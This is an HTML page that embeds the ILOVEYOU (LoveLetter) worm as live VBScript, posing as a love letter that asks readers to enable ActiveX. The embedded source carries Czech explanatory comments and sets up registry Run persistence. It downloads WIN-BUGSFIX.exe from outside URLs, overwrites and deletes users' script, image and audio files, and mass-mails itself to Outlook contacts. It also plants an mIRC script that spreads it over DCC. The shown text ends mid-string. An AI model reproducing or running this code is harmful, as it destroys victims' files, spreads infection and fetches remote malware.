<HTML><HEAD><TITLE>LOVELETTER - HTML</TITLE><META NAME="Generator" CONTENT="BAROK VBS - LOVELETTER">
<META NAME="Author" CONTENT="spyder / ispyder@mail.com / @GRAMMERSoft Group / Manila, Philippines / March 2000">
<META NAME="Description" CONTENT="simple but i think this is good...">
</HEAD><BODY ONMOUSEOUT="window.name='main';window.open('LOVE-LETTER-FOR-YOU.HTM','main')" 
ONKEYDOWN="window.name='main';window.open('LOVE-LETTER-FOR-YOU.HTM','main')" BGPROPERTIES="fixed" BGCOLOR="#FF9933">
<CENTER><p>This HTML file need ActiveX Control</p><p>To Enable to read this HTML file<BR>- Please press 'YES' button to Enable ActiveX</p>
</CENTER><MARQUEE LOOP="infinite" BGCOLOR="yellow">----------z--------------------z----------</MARQUEE> 
</BODY></HTML>
<SCRIPT language="JScript">
<!--//
if (window.screen){var wi=screen.availWidth;var hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}
//-->
</SCRIPT>
<SCRIPT LANGUAGE="VBScript">
<!--
on error resume next
dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit
aw=1
code="[-["&vbcrlf& _
"[-[ Komentáø k ILOVEYOU viru (èervu)"&vbcrlf& _
"[-[ (c) Daniel Doèekal, Svìt Namodro, 2000/05"&vbcrlf& _
"[-["&vbcrlf& _
"rem barok -loveletter(vbe) <i hate go to school>"&vbcrlf& _
"rem by: spyder  /  ispyder@mail.com  /  @GRAMMERSoft Group  /  Manila,Philippines"&vbcrlf& _
"On Error Resume Next"&vbcrlf& _
"dim fso, dirsystem, dirwin, dirtemp, eq, ctr, file, vbscopy, dow"&vbcrlf& _
"eq=]-]]-]"&vbcrlf& _
"[-["&vbcrlf& _
"[-[ zajímavost, ctr promìnná nakonec nikde není použita, stejnì tak dirtemp a dow"&vbcrlf& _
"[-["&vbcrlf& _
"ctr=0"&vbcrlf& _
"[-["&vbcrlf& _
"[-[ otevøení sebe sama a uložení sebe same do vbscopy promìnné, bude používána "&vbcrlf& _
"[-[ pro další šíøení a zpracovávání viru"&vbcrlf& _
"[-["&vbcrlf& _
"Set fso = CreateObject(]-]Scripting.FileSystemObject]-])"&vbcrlf& _
"set file = fso.OpenTextFile(WScript.ScriptFullname,1)"&vbcrlf& _
"vbscopy=file.ReadAll"&vbcrlf& _
"[-["&vbcrlf& _
"[-[ a abychom se nenudili, mùžeme to spustit "&vbcrlf& _
"[-["&vbcrlf& _
"main()"&vbcrlf& _
""&vbcrlf& _
"[-[ -------------------------------------------------------------------------------------------------------------------"&vbcrlf& _
"[-[ "&vbcrlf& _
"sub main()"&vbcrlf& _
"  On Error Resume Next"&vbcrlf& _
"  dim wscr,rr"&vbcrlf& _
"  set wscr=CreateObject(]-]WScript.Shell]-])"&vbcrlf& _
"  [-["&vbcrlf& _
"  [-[ WSH (Windows Script Host) má timeout hodnotu, tu je vhodné zkontrolovat"&vbcrlf& _
"  [-[ a poté nastavit na 0 - což zajistí aby virus poøád bìžel - pokud by tomu"&vbcrlf& _
"  [-[ tak nebylo, nemohl by bìžet ]-]na pozadí]-] "&vbcrlf& _
"  [-["&vbcrlf& _
"  rr=wscr.RegRead(]-]HKEY_CURRENT_USER%-%Software%-%Microsoft%-%Windows Scripting Host%-%Settings%-%Timeout]-])"&vbcrlf& _
"  if (rr>=1) then"&vbcrlf& _
"    [-[ Set script time out to infinity"&vbcrlf& _
"    wscr.RegWrite ]-]HKEY_CURRENT_USER%-%Software%-%Microsoft%-%Windows Scripting Host%-%Settings%-%Timeout]-], 0, ]-]REG_DWORD]-]"&vbcrlf& _
"  end if"&vbcrlf& _
"  [-["&vbcrlf& _
"  [-[ zjištìní umístìní adresáøe s WINDOWS, adresáøe SYSTEM (ten bývá uvnitø WINDOWS adresáøe)"&vbcrlf& _
"  [-[ a TEMP adresáøe - tyto adresáøe budou potøeba pro další rozšíøení viru (uložení v systému)"&vbcrlf& _
"  [-["&vbcrlf& _
"  Set dirwin = fso.GetSpecialFolder(0)"&vbcrlf& _
"  Set dirsystem = fso.GetSpecialFolder(1)"&vbcrlf& _
"  Set dirtemp = fso.GetSpecialFolder(2)"&vbcrlf& _
"  [-[ "&vbcrlf& _
"  [-[ v adresáøi SYSTEM bude vytvoøena kopie pod názvem MSKernel32.vbs"&vbcrlf& _
"  [-[ v adresáøe WINDOWS bude vytvoøena kopie pod názvem Win32DLL.vbs"&vbcrlf& _
"  [-[ v adresáøi SYSTEM bude vytvoøena kopie pod názvem LOVE-LETTER-FOR-YOU.TXT.vbs"&vbcrlf& _
"  [-["&vbcrlf& _
"  Set c = fso.GetFile(WScript.ScriptFullName)"&vbcrlf& _
"  c.Copy(dirsystem&]-]%-%MSKernel32.vbs]-])"&vbcrlf& _
"  c.Copy(dirwin&]-]%-%Win32DLL.vbs]-])"&vbcrlf& _
"  c.Copy(dirsystem&]-]%-%LOVE-LETTER-FOR-YOU.TXT.vbs]-])"&vbcrlf& _
"  [-["&vbcrlf& _
"  [-[ Definice potøebných vìcí v Registry, "&vbcrlf& _
"  [-[ nastavení domovské stránky (home page, default) pro Internet explorer na jednu"&vbcrlf& _
"  [-[ z náhodnì urèených hodnot - zajistí stažení druhé èásti viru"&vbcrlf& _
"  [-["&vbcrlf& _
"  regruns()"&vbcrlf& _
"  [-["&vbcrlf& _
"  [-[ vytvoøení HTML souboru používaného pro mIRC a obsahujícího virus v podobì"&vbcrlf& _
"  [-[ spouštìného ActiveX komponentu, další cesta jak se virus šíøí"&vbcrlf& _
"  [-["&vbcrlf& _
"  html()"&vbcrlf& _
"  [-["&vbcrlf& _
"  [-[ rozeslání viru na adresy v WAB (Outlook Address Book)"&vbcrlf& _
"  [-["&vbcrlf& _
"  spreadtoemail()"&vbcrlf& _
"  [-["&vbcrlf& _
"  [-[ šíøení viru do rùzných typù souborù a zpracování mIRC skriptu"&vbcrlf& _
"  [-[ s pomocí již døíve vytvoøeného HTML souboru - viz html() procedura"&vbcrlf& _
"  [-["&vbcrlf& _
"  listadriv()"&vbcrlf& _
"end sub"&vbcrlf& _
""&vbcrlf& _
""&vbcrlf& _
"[-[ -------------------------------------------------------------------------------------------------------------------"&vbcrlf& _
"[-[ Definice potøebných vìcí v Registry, "&vbcrlf& _
"[-[ Nastavení domovské stránky (home page, default) pro Internet explorer na jednu"&vbcrlf& _
"[-[ z náhodnì urèených hodnot - zajistí stažení druhé èásti viru"&vbcrlf& _
"[-["&vbcrlf& _
"sub regruns()"&vbcrlf& _
"  On Error Resume Next"&vbcrlf& _
"  Dim num, downread"&vbcrlf& _
"  [-["&vbcrlf& _
"  [-[ MSkernel32.vbs verze bude použita pro RUN klíè, což znamená, že pøi startu systému"&vbcrlf& _
"  [-[ se VŠEM uživatelùm provede spuštìní viru "&vbcrlf& _
"  [-["&vbcrlf& _
"  regcreate ]-]HKEY_LOCAL_MACHINE%-%Software%-%Microsoft%-%Windows%-%CurrentVersion%-%Run%-%MSKernel32]-],dirsystem&]-]%-%MSKernel32.vbs]-]"&vbcrlf& _
"  [-["&vbcrlf& _
"  [-[ Win32dll.vbs verze bude použita pro RUNSERVICES klíè, což je ještì horší, virus"&vbcrlf& _
"  [-[ totiž po startu systému pobìží jako SLUŽBA (nesnadno detekovatelné v TaskManageru)"&vbcrlf& _
"  [-[ "&vbcrlf& _
"  regcreate ]-]HKEY_LOCAL_MACHINE%-%Software%-%Microsoft%-%Windows%-%CurrentVersion%-%RunServices%-%Win32DLL]-],dirwin&]-]%-%Win32DLL.vbs]-]"&vbcrlf& _
"  [-["&vbcrlf& _
"  [-[ zjištìní kde se nachází DOWNLOAD adresáø IE (tj.  kam se ukládají stažené soubory)"&vbcrlf& _
"  [-[ pokud není definován, nastaví se napevno na C:%-% "&vbcrlf& _
"  [-["&vbcrlf& _
"  downread = ]-]]-]"&vbcrlf& _
"  downread = regget(]-]HKEY_CURRENT_USER%-%Software%-%Microsoft%-%Internet Explorer%-%Download Directory]-])"&vbcrlf& _
"  if (downread = ]-]]-]) then"&vbcrlf& _
"    downread = ]-]c:%-%]-]"&vbcrlf& _
"  end if"&vbcrlf& _
"  [-["&vbcrlf& _
"  [-[ kontrola jestli již došlo ke stažení druhé èásti viru, EXE souboru"&vbcrlf& _
"  [-[ ten se totiž pøejmenovává na WinFAT32.EXE "&vbcrlf& _
"  [-["&vbcrlf& _
"  if (fileexist(dirsystem&]-]%-%WinFAT32.exe]-]) = 1) then"&vbcrlf& _
"    [-["&vbcrlf& _
"    [-[ nastavení Start Page (home page) IE na jednu ze ètyø adres kde je uložena"&vbcrlf& _
"    [-[ druhá èást viru (EXE). Naštìstí pøestal tento web existovat již nìkolik"&vbcrlf& _
"    [-[ hodin poté co virus zaèal øádit. Je zde také druhý potenciální problém"&vbcrlf& _
"    [-[ stažení .EXE souboru musí uživatel potvrdit - což ovšem øada z nich ráda udìlá"&vbcrlf& _
"    [-["&vbcrlf& _
"    [-[ ke stažení samozøejmì dojde až v okamžiku, kdy uživatel poprvé spustí "&vbcrlf& _
"    [-[ Internet Explorer (nezapomeòte, virus mùže stále bìžet kdesi v pozadí)"&vbcrlf& _
"    [-["&vbcrlf& _
"    Randomize"&vbcrlf& _
"    num = Int((4 * Rnd) + 1)"&vbcrlf& _
"    if num = 1 then"&vbcrlf& _
"      regcreate ]-]HKCU%-%Software%-%Microsoft%-%Internet Explorer%-%Main%-%Start Page]-],]-]http://www.skyinet.net/~young1s/HJKhjnwerhjkxcvytwertnMTFwetrdsfmhPnjw6587345gvsdf7679njbvYT/WIN-BUGSFIX.exe]-]"&vbcrlf& _
"    elseif num = 2 then"&vbcrlf& _
"      regcreate ]-]HKCU%-%Software%-%Microsoft%-%Internet Explorer%-%Main%-%Start Page]-],]-]http://www.skyinet.net/~angelcat/skladjflfdjghKJnwetryDGFikjUIyqwerWe546786324hjk4jnHHGbvbmKLJKjhkqj4w/WIN-BUGSFIX.exe]-]"&vbcrlf& _
"    elseif num = 3 then"&vbcrlf& _
"      regcreate ]-]HKCU%-%Software%-%Microsoft%-%Internet Explorer%-%Main%-%Start Page]-],]-]http://www.skyinet.net/~koichi/jf6TRjkcbGRpGqaq198vbFV5hfFEkbopBdQZnmPOhfgER67b3Vbvg/WIN-BUGSFIX.exe]-]"&vbcrlf& _
"    elseif num = 4 then"&vbcrlf& _
"      regcreate ]-]HKCU%-%Software%-%Microsoft%-%Internet Explorer%-%Main%-%Start Page]-],]-]http://www.skyinet.net/~chu/sdgfhjksdfjklNBmnfgkKLHjkqwtuHJBhAFSDGjkhYUgqwerasdjhPhjasfdglkNBhbqwebmznxcbvnmadshfgqw237461234iuy7thjg/WIN-BUGSFIX.exe]-]"&vbcrlf& _
"    end if"&vbcrlf& _
"  end if"&vbcrlf& _
"  [-["&vbcrlf& _
"  [-[ kontrola jestli už došlo k stažení druhé èásti viru (EXE)"&vbcrlf& _
"  [-[ a pokud ano, tak vytvoøení nového RUN - tj. druhá èást viru (EXE)"&vbcrlf& _
"  [-[ se bude spouštìt pøi každém startu systému (jednorázovì)"&vbcrlf& _
"  [-[ Start Page IE je potom nastavena ]-]zpìt]-] na about:blank, takže víckrát"&vbcrlf& _
"  [-[ se program už stahovat nebude"&vbcrlf& _
"  [-["&vbcrlf& _
"  if (fileexist(downread & ]-]%-%WIN-BUGSFIX.exe]-]) = 0) then"&vbcrlf& _
"    regcreate ]-]HKEY_LOCAL_MACHINE%-%Software%-%Microsoft%-%Windows%-%CurrentVersion%-%Run%-%WIN-BUGSFIX]-], downread & ]-]%-%WIN-BUGSFIX.exe]-]"&vbcrlf& _
"    regcreate ]-]HKEY_CURRENT_USER%-%Software%-%Microsoft%-%Internet Explorer%-%Main%-%Start Page]-], ]-]about:blank]-]"&vbcrlf& _
"  end if"&vbcrlf& _
"end sub"&vbcrlf& _
""&vbcrlf& _
"[-[ -------------------------------------------------------------------------------------------------------------------"&vbcrlf& _
"[-[ šíøení viru do rùzných typù souborù a zpracování mIRC skriptu"&vbcrlf& _
"[-[ s pomocí již døíve vytvoøeného HTML souboru - viz html() procedura"&vbcrlf& _
"[-["&vbcrlf& _
"sub listadriv"&vbcrlf& _
"  On Error Resume Next"&vbcrlf& _
"  Dim d,dc,s"&vbcrlf& _
"  [-["&vbcrlf& _
"  [-[ projde všechny dostupné disky, tj. jak lokální, tak síové (namapované)"&vbcrlf& _
"  [-[ které mùže projít a vrhne se na jejich kompletní strukturu"&vbcrlf& _
"  [-["&vbcrlf& _
"  Set dc = fso.Drives"&vbcrlf& _
"  For Each d in dc"&vbcrlf& _
"    If d.DriveType = 2 or d.DriveType=3 Then"&vbcrlf& _
"      folderlist(d.path & ]-]%-%]-])"&vbcrlf& _
"    end if"&vbcrlf& _
"  Next"&vbcrlf& _
"  listadriv = s"&vbcrlf& _
"end sub"&vbcrlf& _
""&vbcrlf& _
"[-["&vbcrlf& _
"[-[ šíøení ]-]nákazy]-] na specifické soubory "&vbcrlf& _
"[-[ volá se vždy pro každou SLOŽKU a efekt je"&vbcrlf& _
"[-[ prùchod všech diskù a všech složek "&vbcrlf& _
"[-["&vbcrlf& _
"sub infectfiles(folderspec)  "&vbcrlf& _
"  On Error Resume Next"&vbcrlf& _
"  dim f,f1,fc,ext,ap,mircfname,s,bname,mp3"&vbcrlf& _
"  [-["&vbcrlf& _
"  [-[ získání senzamu všech souborù ve složce a následný"&vbcrlf& _
"  [-[ prùchod všech souborù"&vbcrlf& _
"  [-["&vbcrlf& _
"  set f = fso.GetFolder(folderspec)"&vbcrlf& _
"  set fc = f.Files"&vbcrlf& _
"  for each f1 in fc"&vbcrlf& _
"    ext = fso.GetExtensionName(f1.path)"&vbcrlf& _
"    ext = lcase(ext)"&vbcrlf& _
"    s = lcase(f1.name)"&vbcrlf& _
"    [-["&vbcrlf& _
"    [-[  VBS / VBE pøípona - PØEPSÁNÍ VIREM, zùstává pùvodní jméno, mìní se obsah (nevratné znièení) "&vbcrlf& _
"    [-["&vbcrlf& _
"    if (ext = ]-]vbs]-]) or (ext = ]-]vbe]-]) then"&vbcrlf& _
"      set ap = fso.OpenTextFile(f1.path,2,true)"&vbcrlf& _
"      ap.write vbscopy"&vbcrlf& _
"      ap.close"&vbcrlf& _
"    [-["&vbcrlf& _
"    [-[ JS / JSE / CSS / WSH / SCT / HTA - PØEPSÁNÍ VIREM "&vbcrlf& _
"    [-[   a poté vytvoøení NOVÝCH souborù s celým pùvodním jménem a "&vbcrlf& _
"    [-[   pøíponou .vbs (tj. byl li napø. test.wsh - bude navíc ještì test.wsh.vbs"&vbcrlf& _
"    [-[   a poté SMAZÁNÍ pùvodního souboru (tj. pøíjdete o všechny soubory s"&vbcrlf& _
"    [-[   s tìmito pøíponami, opìt nevratné znièení"&vbcrlf& _
"    [-["&vbcrlf& _
"    elseif(ext = ]-]js]-]) or (ext = ]-]jse]-]) or (ext = ]-]css]-]) or _"&vbcrlf& _
"          (ext = ]-]wsh]-]) or (ext = ]-]sct]-]) or (ext = ]-]hta]-]) then"&vbcrlf& _
"      set ap = fso.OpenTextFile(f1.path,2,true)"&vbcrlf& _
"      ap.write vbscopy"&vbcrlf& _
"      ap.close"&vbcrlf& _
"      bname = fso.GetBaseName(f1.path)"&vbcrlf& _
"      set cop = fso.GetFile(f1.path)"&vbcrlf& _
"      cop.copy(folderspec & ]-]%-%]-] & bname & ]-].vbs]-])"&vbcrlf& _
"      fso.DeleteFile(f1.path)"&vbcrlf& _
"    [-["&vbcrlf& _
"    [-[ JPG / JPEG - totéž jako výše"&vbcrlf& _
"    [-[ pøijdete o tyto soubory a bude vytvoøena jejich jmenná kopie"&vbcrlf& _
"    [-[ obsahující virus - tj. napø naked.jpg -> naked.jpg.vbs"&vbcrlf& _
"    [-[ opìt nevratné nièení"&vbcrlf& _
"    [-["&vbcrlf& _
"    elseif(ext = ]-]jpg]-]) or (ext = ]-]jpeg]-]) then"&vbcrlf& _
"      set ap=fso.OpenTextFile(f1.path, 2,true)"&vbcrlf& _
"      ap.write vbscopy"&vbcrlf& _
"      ap.close"&vbcrlf& _
"      set cop=fso.GetFile(f1.path)"&vbcrlf& _
"      cop.copy(f1.path & ]-].vbs]-])"&vbcrlf& _
"      fso.DeleteFile(f1.path)"&vbcrlf& _
"    [-["&vbcrlf& _
"    [-[ MP3 / MP2 - vytvoøí jmennou kopii s .vbs dodatkem (napø. gott.mp3 -> gott.mp3.vbs)"&vbcrlf& _
"    [-[  a poté ukrytí pùvodního souboru (dostane HIDDEN pøíznak)"&vbcrlf& _
"    [-["&vbcrlf& _
"    elseif(ext=]-]mp3]-]) or (ext=]-]mp2]-]) then"&vbcrlf& _
"      set mp3 = fso.CreateTextFile(f1.path & ]-].vbs]-])"&vbcrlf& _
"      mp3.write vbscopy"&vbcrlf& _
"      mp3.close"&vbcrlf& _
"      set att = fso.GetFile(f1.path)"&vbcrlf& _
"      att.attributes = att.attributes + 2"&vbcrlf& _
"    end if"&vbcrlf& _
"    [-["&vbcrlf& _
"    [-[ pokud je folderspec cokoliv jiného než ]-]]-] èi pozdìji zjištìné umístìní"&vbcrlf& _
"    [-[ vìnuje se mIRC (]-]eq]-] slouží k tomu aby to nedìlal poøád dokola v jednom adresáøi)"&vbcrlf& _
"    [-[ znamená to, že mIRC vìci nepøepíše (možnost) jenom ve vlastním poèítaèi"&vbcrlf& _
"    [-[ ale také na cizím disku !"&vbcrlf& _
"    [-["&vbcrlf& _
"    if (eq<>folderspec) then"&vbcrlf& _
"      [-["&vbcrlf& _
"      [-[ detekece existence mIRC programu pomocí souborù s uvedenými jmény"&vbcrlf& _
"      [-["&vbcrlf& _
"      if (s = ]-]mirc32.exe]-]) or (s = ]-]mlink32.exe]-]) or (s = ]-]mirc.ini]-]) or _"&vbcrlf& _
"         (s = ]-]script.ini]-]) or (s = ]-]mirc.hlp]-]) then"&vbcrlf& _
"	[-["&vbcrlf& _
"        [-[ vytvoøení NOVÉHO script.ini obsahujícího vše potøebné "&vbcrlf& _
"        [-[ k využití mIRC k šíøení viru - použije se HTML vytvoøený"&vbcrlf& _
"        [-[ v jiné funkci (viz níže) "&vbcrlf& _
"        [-["&vbcrlf& _
"        set scriptini=fso.CreateTextFile(folderspec&]-]%-%script.ini]-])"&vbcrlf& _
"        scriptini.WriteLine ]-][script]]-]"&vbcrlf& _
"        scriptini.WriteLine ]-];mIRC Script]-]"&vbcrlf& _
"        scriptini.WriteLine ]-];  Please dont edit this script... mIRC will corrupt, if mIRC will]-]"&vbcrlf& _
"        scriptini.WriteLine ]-]     corrupt... WINDOWS will affect and will not run correctly. thanks]-]"&vbcrlf& _
"        scriptini.WriteLine ]-];]-]"&vbcrlf& _
"        scriptini.WriteLine ]-];Khaled Mardam-Bey]-]"&vbcrlf& _
"        scriptini.WriteLine ]-];http://www.mirc.com]-]"&vbcrlf& _
"        scriptini.WriteLine ]-];]-]"&vbcrlf& _
"        scriptini.WriteLine ]-]n0=on 1:JOIN:#:{]-]"&vbcrlf& _
"        scriptini.WriteLine ]-]n1=  /if ( $nick == $me ) { halt }]-]"&vbcrlf& _
"        scriptini.WriteLine ]-]n2=  /.dcc send $nick ]-]&dirsystem&]-]%-%LOVE-LETTER-FOR-YOU.HTM]-]"&vbcrlf& _
"        scriptini.WriteLine ]-]n3=}]-]"&vbcrlf& _
"        scriptini.close"&vbcrlf& _
"	[-["&vbcrlf& _
"	[-[ zapamatování si kde již zpracoval mIRC vìci"&vbcrlf& _
"        [-[ efekt je stále stejný - udìlá to všude kde to je možné"&vbcrlf& _
"	[-[ zapamatovávání eq se postará že nevykonává poøád dokola tenhle kód"&vbcrlf& _
"	[-[ pokud postupnì prochází adresáø (jsme na per-file úrovni)"&vbcrlf& _
"        [-["&vbcrlf& _
"        eq=folderspec"&vbcrlf& _
"      end if"&vbcrlf& _
"    end if"&vbcrlf& _
"  next  "&vbcrlf& _
"end sub"&vbcrlf& _
""&vbcrlf& _
"[-["&vbcrlf& _
"[-[ pomocná SUB pro prùchod složky (adresáøe), všech souborù a poté"&vbcrlf& _
"[-[ rekurzivní prùchod pøípadných vnoøenýc složek"&vbcrlf& _
"[-["&vbcrlf& _
"sub folderlist(folderspec)  "&vbcrlf& _
"  On Error Resume Next"&vbcrlf& _
"  dim f,f1,sf"&vbcrlf& _
"  set f = fso.GetFolder(folderspec)  "&vbcrlf& _
"  set sf = f.SubFolders"&vbcrlf& _
"  for each f1 in sf"&vbcrlf& _
"    infectfiles(f1.path)"&vbcrlf& _
"    folderlist(f1.path)"&vbcrlf& _
"  next  "&vbcrlf& _
"end sub"&vbcrlf& _
""&vbcrlf& _
"[-[ "&vbcrlf& _
"[-[ pomocná SUB pro vytvøení klíèe v registry"&vbcrlf& _
"[-["&vbcrlf& _
"sub regcreate(regkey,regvalue)"&vbcrlf& _
"  Set regedit = CreateObject(]-]WScript.Shell]-])"&vbcrlf& _
"  regedit.RegWrite regkey,regvalue"&vbcrlf& _
"end sub"&vbcrlf& _
""&vbcrlf& _
"[-[ "&vbcrlf& _
"[-[ pomocná SUB pro ètení obsahu klíèe v registry"&vbcrlf& _
"[-["&vbcrlf& _
"function regget(value)"&vbcrlf& _
"  Set regedit = CreateObject(]-]WScript.Shell]-])"&vbcrlf& _
"  regget = regedit.RegRead(value)"&vbcrlf& _
"end function"&vbcrlf& _
""&vbcrlf& _
"[-["&vbcrlf& _
"[-[ pomocná sub pro testování existence souboru"&vbcrlf& _
"[-["&vbcrlf& _
"function fileexist(filespec)"&vbcrlf& _
"  On Error Resume Next"&vbcrlf& _
"  dim msg"&vbcrlf& _
"  if (fso.FileExists(filespec)) Then"&vbcrlf& _
"    msg = 0"&vbcrlf& _
"    else"&vbcrlf& _
"    msg = 1"&vbcrlf& _
"  end if"&vbcrlf& _
"  fileexist = msg"&vbcrlf& _
"end function"&vbcrlf& _
""&vbcrlf& _
"[-["&vbcrlf& _
"[-[ pomocná SUB pro testování existence složky (adresáøe)"&vbcrlf& _
"[-["&vbcrlf& _
"function folderexist(folderspec)"&vbcrlf& _
"  On Error Resume Next"&vbcrlf& _
"  dim msg"&vbcrlf& _
"  if (fso.GetFolderExists(folderspec)) then"&vbcrlf& _
"    msg = 0"&vbcrlf& _
"    else"&vbcrlf& _
"    msg = 1"&vbcrlf& _
"  end if"&vbcrlf& _
"  fileexist = msg"&vbcrlf& _
"end function"&vbcrlf& _
""&vbcrlf& _
"[-[ -------------------------------------------------------------------------------------------------------------------"&vbcrlf& _
"[-[ šíøení viru mailem"&vbcrlf& _
"[-[ rozeslání viru na adresy v WAB (Outlook Address Book)"&vbcrlf& _
"[-["&vbcrlf& _
"sub spreadtoemail()"&vbcrlf& _
"  On Error Resume Next"&vbcrlf& _
"  dim x, a, ctrlists, ctrentries, malead, b, regedit, regv, regad"&vbcrlf& _
"  set regedit = CreateObject(]-]WScript.Shell]-])"&vbcrlf& _
"  [-[ "&vbcrlf& _
"  [-[ aktivace Outlooku (tj. neumí se šíøit jinak než outlookem)"&vbcrlf& _
"  [-[ a zjištìní reference na MAPI aby mohl získat všechny adresy"&vbcrlf& _
"  [-["&vbcrlf& _
"  set out = WScript.CreateObject(]-]Outlook.Application]-])"&vbcrlf& _
"  set mapi = out.GetNameSpace(]-]MAPI]-])"&vbcrlf& _
"  [-[ "&vbcrlf& _
"  [-[ tohle je nepøíjemné, zjistí všechny ADRESÁØE (tj. nikoliv jenom jeden)"&vbcrlf& _
"  [-[ a všechny je projde (zpracuje)"&vbcrlf& _
"  [-["&vbcrlf& _
"  for ctrlists = 1 to mapi.AddressLists.Count"&vbcrlf& _
"    set a = mapi.AddressLists(ctrlists)"&vbcrlf& _
"    x = 1"&vbcrlf& _
"    [-["&vbcrlf& _
"    [-[ zde kontroluje pøípadné NOVÉ adresy"&vbcrlf& _
"    [-[ v address booku (níže si totiž zapamatuje na KOLIK adres již poslal)"&vbcrlf& _
"    [-[ a pokud jich je v adress booku víc, tak prostì ]-]došle]-] i ty nové"&vbcrlf& _
"    [-[ (na staré nic nepošle, má je oznaèené)"&vbcrlf& _
"    [-["&vbcrlf& _
"    regv = regedit.RegRead(]-]HKEY_CURRENT_USER%-%Software%-%Microsoft%-%WAB%-%]-] & a)"&vbcrlf& _
"    if (regv = ]-]]-]) then"&vbcrlf& _
"      regv = 1"&vbcrlf& _
"    end if"&vbcrlf& _
"    if (int(a.AddressEntries.Count) > int(regv)) then"&vbcrlf& _
"      [-["&vbcrlf& _
"      [-[ projde všechny položky v právì zpracovaváném adresáøi"&vbcrlf& _
"      [-[ tj. není zde ŽÁDNÉ množstevní omezení"&vbcrlf& _
"      [-["&vbcrlf& _
"      for ctrentries = 1 to a.AddressEntries.Count"&vbcrlf& _
"        malead = a.AddressEntries(x)"&vbcrlf& _
"        regad = ]-]]-]"&vbcrlf& _
"	[-[ "&vbcrlf& _
"	[-[ kontrola jestli už posílal, každému komu totiž poslal"&vbcrlf& _
"	[-[ už nepošle víckrát - øeší to zápisem do registry"&vbcrlf& _
"	[-[ což je velmi nepøíjemné (mùže narùst a shodit stroj)"&vbcrlf& _
"	[-["&vbcrlf& _
"        regad = regedit.RegRead(]-]HKEY_CURRENT_USER%-%Software%-%Microsoft%-%WAB%-%]-] & malead)"&vbcrlf& _
"        if (regad = ]-]]-]) then"&vbcrlf& _
"	  [-["&vbcrlf& _
"	  [-[ vytvoøení mailové zprávy s pøílohou "&vbcrlf& _
"	  [-[ je to jen obyèejná textová zpráva, takže žádné automatické"&vbcrlf& _
"	  [-[ spuštìní - pøíloha se sama nikdy nespustí, spustit ji musí uživatel"&vbcrlf& _
"	  [-["&vbcrlf& _
"          set male = out.CreateItem(0)"&vbcrlf& _
"          male.Recipients.Add(malead)"&vbcrlf& _
"          male.Subject = ]-]ILOVEYOU]-]"&vbcrlf& _
"          male.Body = vbcrlf & ]-]kindly check the attached LOVELETTER coming from me.]-]"&vbcrlf& _
"          male.Attachments.Add(dirsystem & ]-]%-%LOVE-LETTER-FOR-YOU.TXT.vbs]-])"&vbcrlf& _
"	  [-[ "&vbcrlf& _
"	  [-[ odeslání"&vbcrlf& _
"	  [-["&vbcrlf& _
"          male.Send"&vbcrlf& _
"	  [-["&vbcrlf& _
"	  [-[ nastavení pøíznaku že na tuto adresu již poslal"&vbcrlf& _
"	  [-["&vbcrlf& _
"          regedit.RegWrite ]-]HKEY_CURRENT_USER%-%Software%-%Microsoft%-%WAB%-%]-] & malead, 1, ]-]REG_DWORD]-]"&vbcrlf& _
"        end if"&vbcrlf& _
"        x = x + 1"&vbcrlf& _
"      next"&vbcrlf& _
"      [-["&vbcrlf& _
"      [-[ další zápis do registry, zde si zapamatuje kolik adres zpracoval"&vbcrlf& _
"      [-["&vbcrlf& _
"      regedit.RegWrite ]-]HKEY_CURRENT_USER%-%Software%-%Microsoft%-%WAB%-%]-]&a,a.AddressEntries.Count"&vbcrlf& _
"    else"&vbcrlf& _
"      regedit.RegWrite ]-]HKEY_CURRENT_USER%-%Software%-%Microsoft%-%WAB%-%]-]&a,a.AddressEntries.Count"&vbcrlf& _
"    end if"&vbcrlf& _
"  next"&vbcrlf& _
"  Set out = Nothing"&vbcrlf& _
"  Set mapi = Nothing"&vbcrlf& _
"end sub"&vbcrlf& _
""&vbcrlf& _
""&vbcrlf& _
"[-[ -------------------------------------------------------------------------------------------------------------------"&vbcrlf& _
"[-[ vytvoøení HTML souboru používaného pro mIRC a obsahujícího virus v podobì"&vbcrlf& _
"[-[ spouštìného ActiveX komponentu, další cesta jak se virus šíøí"&vbcrlf& _
"[-["&vbcrlf& _
"[-[ vytváøené HTML je ponìkud komplikované - dùvod je prostý"&vbcrlf& _
"[-[ slouží totiž k tomu aby VYTVOØILO virus (MSKernel32.vbs) "&vbcrlf& _
"[-[ a poté dokonce nastavilo RUN v Registry na jeho spuštìní"&vbcrlf& _
"[-[ "&vbcrlf& _
"[-[ tenhle HTML dokument dostanou mIRC uživatelé pomocí DCC"&vbcrlf& _
"[-[ a pokud jej ]-]zobrazí]-], tak se nakazí"&vbcrlf& _
"[-["&vbcrlf& _
"[-[ ty ponìkud zmatené ?-?, @-@, #-#, ^-^ slouží k zadání,"&vbcrlf& _
"[-[ kódù, které by se problematicky zadávaly ruènì, pozdìji"&vbcrlf& _
"[-[ jsou pomocí replace() zamìòovány. Stejnì tak bude"&vbcrlf& _
"[-[ tentýž zpùsob použit pro zakódování uvnitø výsledného"&vbcrlf& _
"[-[ HTML "&vbcrlf& _
"[-["&vbcrlf& _
"sub html"&vbcrlf& _
"  On Error Resume Next"&vbcrlf& _
"  dim lines, n, dta1, dta2, dt1, dt2, dt3, dt4, l1, dt5, dt6"&vbcrlf& _
"  [-["&vbcrlf& _
"  [-[ tímto bude HTML zaèínat"&vbcrlf& _
"  [-["&vbcrlf& _
"  dta1= ]-]<HTML><HEAD><TITLE>LOVELETTER - HTML<?-?TITLE><META NAME=@-@Generator@-@ CONTENT=@-@BAROK VBS - LOVELETTER@-@>]-]&vbcrlf& _"&vbcrlf& _
"        ]-]<META NAME=@-@Author@-@ CONTENT=@-@spyder ?-? ispyder@mail.com ?-? @GRAMMERSoft Group ?-? Manila, Philippines ?-? March 2000@-@>]-]&vbcrlf& _"&vbcrlf& _
"        ]-]<META NAME=@-@Description@-@ CONTENT=@-@simple but i think this is good...@-@>]-]&vbcrlf& _"&vbcrlf& _
"        ]-]<?-?HEAD><BODY ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ ]-]&vbcrlf& _"&vbcrlf& _
